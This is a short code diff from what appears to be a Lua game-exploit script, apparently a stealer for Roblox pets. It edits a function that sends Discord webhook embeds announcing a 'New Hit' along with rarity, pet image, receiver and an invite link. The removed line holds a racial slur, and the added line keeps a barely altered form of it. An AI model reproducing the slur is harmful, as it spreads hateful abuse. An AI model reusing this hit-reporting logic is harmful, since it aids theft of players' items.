@@ -1031,7 +1031,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "FuegoEterno Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Nigger||",
+                ["title"] = "**New Hit** ||igger||",
                 ["url"] = "https://discord.gg/pUKMNeRwsn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
